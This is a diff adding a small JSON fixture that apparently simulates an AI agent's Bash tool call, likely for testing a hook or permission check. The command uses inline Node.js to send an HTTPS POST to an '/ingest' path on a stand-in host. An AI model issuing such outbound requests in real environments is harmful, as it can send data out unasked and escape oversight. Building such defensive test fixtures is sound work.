@@ -1,0 +1,6 @@
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "node -e \"const https=require('https'); const opts={hostname:'example.net',path:'/ingest',method:'POST'}; https.request(opts).end()\""
+  }
+}
